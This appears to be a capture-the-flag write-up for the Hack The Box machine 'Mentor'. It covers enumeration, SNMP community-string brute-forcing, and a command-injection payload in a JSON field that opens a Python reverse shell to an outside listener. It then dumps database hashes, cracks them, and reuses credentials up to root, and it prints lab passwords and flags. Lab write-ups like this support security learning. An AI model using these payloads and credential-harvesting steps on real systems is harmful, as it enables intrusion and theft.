IP: 10.10.11.193
# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/mentor 10.10.11.193

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

also a UDP and full port scan
```bash
sudo nmap -sU -oA nmap/udp 10.10.11.193 --min-rate 10000

sudo nmap -p- -oA nmap/all-ports 10.10.11.193
```

UDP port 161 is open, which is snmp

Host name: mentorquotes.htb

## Port 80
Flask application due to error page.

## Gobuster
```bash
gobuster -m dir -u http://mentorquotes.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o root.goubster
```

## VHOST
```bash
ffuf -u http://mentorquotes.htb -H 'Host: FUZZ.mentorquotes.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt  -fw 18 -mc all
```

Get a result for api

## API
Gives this page: `{"detail":"Not Found"}`. Which when googling shows its fastapi which has a docs page.

# Looking at the API
We can create a user with /auth/signup, then login and we get a JWT.

Can't do anything with the JWT, says admin is needed.

A username for james: `james@mentorquotes.htb`

# SNMP
```bash
snmpwalk -v2c -c public 10.10.11.193
```

Didn't show much

Bruteforcing with snmpbrute.py
```bash
python3 snmpbrute.py -t 10.10.11.193 -f /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
```

Found internal string aswell

snmpwalk again.
```bash
snmpbulkwalk -v2c -c internal 10.10.11.193 | tee internal.snmpwalk
```

Looking for python files, as the website is made with flask.
```bash
cat internal.snmpwalk | grep '\.py'
```

Which gives a password.
```txt
kj23sadkj123as0-d213
```

Trying the as james' password works!
```JWT
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
```

# API as James
Enumerating users shows a svc account:
```json
{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc"}
```

Trying `/admin` which works. (You could also fuzz with the authorization header if you dont fell like guessing)
```json
{"admin_funcs":{"check db connection":"/check","backup the application":"/backup"}}
```

backup is a POST req which has command injection.
```json
{
"path":"/etc/passwd; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.17\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")';"
}
```

# Foothold
Inside a docker container.

Looking at the db.py script there are creds.
```
postgres:postgres
```

Going to change the api to show the passwords of the users when listing all users.

This can be done by updating the models.py file to include the password, as it is pulling in everything from the database.
```txt
class userDB(BaseModel):
    id: int
    email: str
    username: str
    password: str 
```

Then grabbing the hashes and reverting the file.
```
[{"id":1,"email":"james@mentorquotes.htb","username":"james","password":"7ccdcd8c05b59add9c198d492b36a503"},{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc","password":"53f22d0dfa10dce7e29cd31f4f953fd8"},{"id":4,"email":"eljay@htb.com","username":"eljay","password":"7c6a180b36896a0a8c02787eeafb0e4c"}]
```

Cracking the svchash with crackstation
```
123meunomeeivani
```

# SSH as svc
User.txt
```txt
4eb83b8cc835e4bd7869e4bc23b50326
```

linpeas.sh

didn't show anything.

Check the snmp conf file.

This has a password in it, when trying it for james on the box it works.
```txt
SuperSecurePassword123__
```

# SSH as james
james can run sh as root.

root.txt
```
7e20d674abf66c03780e698fd0138993
```

Fin
